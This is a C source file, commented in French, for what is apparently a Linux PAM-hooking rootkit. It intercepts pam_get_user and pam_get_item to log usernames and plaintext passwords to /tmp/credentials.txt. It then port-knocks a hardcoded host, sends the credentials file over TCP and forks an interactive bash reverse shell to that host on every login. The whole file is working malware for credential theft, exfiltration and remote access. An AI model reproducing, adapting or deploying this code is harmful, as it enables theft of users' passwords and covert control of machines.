#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <syslog.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <pty.h>      // Pour forkpty()
#include <utmp.h>     // Pour forkpty()

#include "malware_http.h"  // On n’utilise que register_host désormais

// ------------------------------------------------------------------
// Pointeurs PAM
// ------------------------------------------------------------------
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

static pam_get_item_t original_pam_get_item = NULL;
static pam_get_user_t original_pam_get_user = NULL;

// ------------------------------------------------------------------
// Config
// ------------------------------------------------------------------
#define CREDENTIALS_FILE "/tmp/credentials.txt"

// IP/ports
#define REMOTE_HOST       "192.168.64.11"
#define KNOCK_PORT1       5001
#define KNOCK_PORT2       5002
#define KNOCK_PORT3       5003
#define CREDENTIALS_PORT  4444
#define SHELL_PORT        4445

// API
#define C2_API_IP         "192.168.64.11"
#define C2_API_PORT       8080

// ------------------------------------------------------------------
// Fonctions utilitaires
// ------------------------------------------------------------------
static const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

static void write_to_file(const char *type, const char *data) {
    FILE *file = fopen(CREDENTIALS_FILE, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s : %m", CREDENTIALS_FILE);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
}

// Si vous n'utilisez pas ces fonctions, vous pouvez soit les supprimer, soit ajouter __attribute__((unused))
// static void get_machine_hostname(char *out, size_t out_size) __attribute__((unused));
// static void get_machine_hostname(char *out, size_t out_size) {
//     if (gethostname(out, out_size) == 0) {
//         out[out_size - 1] = '\0';
//     } else {
//         strncpy(out, "UnknownHost", out_size - 1);
//         out[out_size - 1] = '\0';
//     }
// }
//
// static void get_local_ip(char *out, size_t out_size) __attribute__((unused));
// static void get_local_ip(char *out, size_t out_size) {
//     int sock = socket(AF_INET, SOCK_DGRAM, 0);
//     if (sock < 0) {
//         strncpy(out, "0.0.0.0", out_size - 1);
//         out[out_size - 1] = '\0';
//         return;
//     }
//     struct sockaddr_in tmp;
//     memset(&tmp, 0, sizeof(tmp));
//     tmp.sin_family = AF_INET;
//     tmp.sin_port   = htons(53);
//     inet_pton(AF_INET, "8.8.8.8", &tmp.sin_addr);
//     connect(sock, (struct sockaddr*)&tmp, sizeof(tmp));
//     struct sockaddr_in name;
//     socklen_t namelen = sizeof(name);
//     if (getsockname(sock, (struct sockaddr*)&name, &namelen) == 0) {
//         inet_ntop(AF_INET, &name.sin_addr, out, out_size);
//     } else {
//         strncpy(out, "0.0.0.0", out_size - 1);
//     }
//     close(sock);
//     out[out_size - 1] = '\0';
// }

// ------------------------------------------------------------------
// Fonctions de knocking, envoi de fichier et reverse shell
// ------------------------------------------------------------------
static int port_knock(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] port_knock: socket : %m");
        return -1;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
    } else {
        syslog(LOG_INFO, "[INFO] Knock réussi sur %s:%d", ip, port);
    }
    close(sock);
    return 0;
}

static void send_file_tcp(const char *ip, int remote_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
        return;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(remote_port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] Echec connexion %s:%d : %m", ip, remote_port);
        close(sock);
        return;
    }
    FILE *f = fopen(CREDENTIALS_FILE, "r");
    if (!f) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour envoi", CREDENTIALS_FILE);
        close(sock);
        return;
    }
    char buffer[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] Echec send : %m");
            fclose(f);
            close(sock);
            return;
        }
    }
    fclose(f);
    close(sock);
    syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
}

// ------------------------------------------------------------------
// Nouvelle version de launch_reverse_shell utilisant forkpty()
// pour allouer une pseudo-tty et ainsi permettre le job control.
// ------------------------------------------------------------------
static void launch_reverse_shell(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: socket creation failed: %m");
        _exit(0);
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: connection failed: %m");
        close(sock);
        _exit(0);
    }
    
    int master_fd;
    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0) {
        syslog(LOG_ERR, "[ERROR] forkpty failed: %m");
        close(sock);
        _exit(0);
    }
    if (pid == 0) {
        // Processus enfant : exécution d'un shell interactif
        execl("/bin/bash", "bash", "-i", NULL);
        _exit(0);
    } else {
        // Processus parent : relais entre la socket et la pseudo-tty
        char buffer[1024];
        fd_set fds;
        int nfds = (sock > master_fd ? sock : master_fd) + 1;
        while (1) {
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            FD_SET(master_fd, &fds);
            int ret = select(nfds, &fds, NULL, NULL, NULL);
            if (ret < 0)
                break;
            if (FD_ISSET(sock, &fds)) {
                int n = read(sock, buffer, sizeof(buffer));
                if (n <= 0)
                    break;
                write(master_fd, buffer, n);
            }
            if (FD_ISSET(master_fd, &fds)) {
                int n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0)
                    break;
                write(sock, buffer, n);
            }
        }
        close(sock);
        close(master_fd);
    }
}

// ------------------------------------------------------------------
// Intercepteurs PAM
// ------------------------------------------------------------------
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym: %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        write_to_file("Login", *user);
    }
    return retval;
}

int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym: %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        const char *password = (const char*)(*item);
        write_to_file("Password", password);

        // 1) Effectuer le port knocking
        port_knock(REMOTE_HOST, KNOCK_PORT1);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT2);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT3);
        sleep(1);

        // 2) Envoi des credentials
        send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);

        // 3) Lancement du reverse shell dans un processus séparé pour ne pas bloquer l'authentification
        pid_t shell_pid = fork();
        if (shell_pid == 0) {
            launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
            _exit(0);
        }
    }
    return retval;
}

